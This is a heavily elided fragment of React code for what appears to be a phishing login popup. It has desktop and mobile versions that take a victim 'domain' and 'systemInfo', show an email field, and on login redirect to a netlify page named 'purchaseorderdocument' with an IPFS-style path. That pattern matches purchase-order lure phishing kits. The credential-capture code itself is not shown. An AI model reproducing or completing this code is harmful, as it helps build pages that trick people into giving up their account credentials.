...
const Popup = ({ domain, eparams, systemInfo }) => {
  ...
  const handleLogin = async (e) => {
    ...
    window.location.href = "https://purchaseorderdocument.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq";
  };
...
const PopupMobile = ({ domain, eparams, systemInfo }) => {
  ...
  return (
    <div style={{  
      ...
      {/* Username (editable) */}
      <div style={{ marginBottom: "8px", fontSize: "2px" }}>
        <InputWithIcon
          type="text"
          placeholder="Email address"
          value={email}
